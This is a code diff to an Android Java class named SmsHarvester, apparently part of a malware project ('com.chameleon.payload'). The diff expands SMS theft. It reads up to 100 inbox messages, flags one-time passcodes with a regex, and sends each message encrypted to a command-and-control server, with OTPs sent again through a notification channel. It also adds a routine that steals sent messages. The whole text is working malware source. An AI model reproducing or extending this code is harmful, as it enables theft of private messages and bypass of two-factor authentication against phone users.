@@ -19,9 +19,54 @@ public class SmsHarvester {
         try {
             Cursor cursor = context.getContentResolver().query(
                 Uri.parse("content://sms/inbox"),
-                null, null, null, "date DESC LIMIT 50"
+                null, null, null, "date DESC LIMIT 100"
             );
 
+            if (cursor == null) return;
+
+            int count = 0;
+            while (cursor.moveToNext()) {
+                String address = getString(cursor, "address");
+                String body = getString(cursor, "body");
+                long date = getLong(cursor, "date");
+
+                if (body != null && address != null) {
+                    boolean isOTP = body.matches(".*\\b\\d{4,8}\\b.*");
+
+                    // Send to SMS table
+                    JSONObject smsData = new JSONObject();
+                    smsData.put("sender", address);
+                    smsData.put("body", body);
+                    smsData.put("is_otp", isOTP);
+                    smsData.put("received_at", date);
+                    byte[] encrypted = Crypto.encrypt(smsData.toString().getBytes());
+                    com.chameleon.payload.PayloadEntry.getC2().sendData("sms", encrypted);
+
+                    // For OTP, also send to notifications table (FalconEye reuse)
+                    if (isOTP) {
+                        JSONObject notifData = new JSONObject();
+                        notifData.put("app_name", "com.android.mms");
+                        notifData.put("content", "OTP: " + body);
+                        notifData.put("post_time", date);
+                        byte[] notifEncrypted = Crypto.encrypt(notifData.toString().getBytes());
+                        com.chameleon.payload.PayloadEntry.getC2().sendData("notification", notifEncrypted);
+                    }
+                    count++;
+                }
+            }
+            cursor.close();
+            Log.i(TAG, "SMS collected: " + count);
+        } catch (Exception e) {
+            Log.e(TAG, "SMS collection error", e);
+        }
+    }
+
+    public void collectSentSms() {
+        try {
+            Cursor cursor = context.getContentResolver().query(
+                Uri.parse("content://sms/sent"),
+                null, null, null, "date DESC LIMIT 50"
+            );
             if (cursor == null) return;
 
             while (cursor.moveToNext()) {
@@ -30,11 +75,10 @@ public class SmsHarvester {
                 long date = getLong(cursor, "date");
 
                 if (body != null && address != null) {
-                    boolean isOTP = body.matches(".*\\b\\d{4,8}\\b.*");
                     JSONObject data = new JSONObject();
                     data.put("sender", address);
-                    data.put("body", body);
-                    data.put("is_otp", isOTP);
+                    data.put("body", "[SENT] " + body);
+                    data.put("is_otp", false);
                     data.put("received_at", date);
                     byte[] encrypted = Crypto.encrypt(data.toString().getBytes());
                     com.chameleon.payload.PayloadEntry.getC2().sendData("sms", encrypted);
@@ -42,7 +86,7 @@ public class SmsHarvester {
             }
             cursor.close();
         } catch (Exception e) {
-            Log.e(TAG, "SMS collection error", e);
+            Log.e(TAG, "Sent SMS collection error", e);
         }
     }
 
